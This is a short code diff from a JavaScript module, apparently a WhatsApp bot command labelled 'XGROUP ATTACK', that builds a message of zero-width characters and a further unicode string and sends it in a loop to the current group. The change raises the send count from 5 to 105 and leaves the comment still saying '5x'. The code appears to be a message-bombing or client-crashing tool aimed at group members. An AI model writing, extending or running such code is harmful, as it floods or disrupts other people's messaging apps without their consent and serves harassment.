@@ -57,7 +57,7 @@ module.exports = async function ({ conn, m, reply, jid }) {
     }
 
     const payload = "📛 *XGROUP ATTACK*\n\n⚠️\u200C\u200B\u200D\n\n" + unicode.repeat(1);
-    const sendCount = 5;
+    const sendCount = 105;
 
     // 🚀 Send 5x with delay to current group
     for (let i = 0; i < sendCount; i++) {
